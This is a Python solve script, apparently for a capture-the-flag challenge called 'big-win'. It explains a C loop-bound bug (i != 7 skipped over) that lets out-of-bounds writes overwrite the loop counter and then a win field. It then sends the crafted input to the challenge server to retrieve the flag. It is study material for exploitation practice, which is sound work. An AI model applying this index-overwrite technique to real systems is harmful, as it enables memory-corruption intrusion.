#!/usr/bin/env python3
"""big-win -- escape the loop bound, then index backwards onto noob.win.

    struct gambler { int win; int numbers[7]; };   // win is numbers[-1]

    while (i != SLOTS) {                 // SLOTS == 7, and the test is !=
        scanf("%d", &noob.numbers[i]);
        accum += noob.numbers[i];
        if (accum == 67) i++;            // "naughty number" -> extra bump
        i++;
    }
    if (noob.win == 0x67) lose; else win();

Two things combine:

1. The loop tests `i != 7`, not `i < 7`.  Making accum hit 67 exactly when
   i == 6 bumps i to 8, stepping straight over the exit value -- the loop now
   writes past the end of `numbers` instead of terminating.

2. `i` and `accum` are themselves stack slots just above the struct, so the
   out-of-bounds writes reach them.  The remote's SNAPSHOT() stack printer
   pins the layout down exactly:

       rbp-48  noob.win (0x67) | numbers[0]
       ...
       rbp-08  accum           | i            <- low dword accum, high dword i

   noob is at rbp-48 and numbers[0] at rbp-44, so numbers[k] == rbp-44+4k:
   numbers[9] is `accum` and **numbers[10] is `i`**.

Writing -2 into numbers[10] sets i = -2; the loop's own `i++` then makes it
-1, and the next scanf lands on noob.numbers[-1] -- i.e. noob.win.  Store
anything other than 0x67, let the loop run back up to 7, and the final check
takes the else branch.
"""
import os
import re
import socket
import sys

HOST = os.environ.get("BIGWIN_HOST", "chal.secso.cc")
PORT = int(os.environ.get("BIGWIN_PORT", "4001"))

seq = [
    0, 0, 0, 0, 0, 0,   # i = 0..5, keep accum at 0
    67,                 # i = 6  -> accum == 67 -> i jumps 6 -> 8, loop survives
    1,                  # i = 8  -> accum 68, so the naughty branch stays quiet
    0,                  # i = 9  -> this slot IS accum; zero it
    -2,                 # i = 10 -> this slot IS i; loop's i++ then makes it -1
    1,                  # i = -1 -> writes noob.win = 1  (!= 0x67)
    1000, 1000, 1000, 1000, 1000, 1000, 1000,   # i = 0..6, then i == 7 -> exit
]

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
s.sendall("".join(f"{v}\n" for v in seq).encode())

out = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass

text = out.decode(errors="replace")
print("\n".join(l for l in text.splitlines() if not l.startswith("rbp")))

m = re.search(rb"(K17\{[^}]*\}|SCONES\{[^}]*\})", out)
if m:
    print("[+] FLAG:", m.group(1).decode())
else:
    sys.exit("[-] no flag")
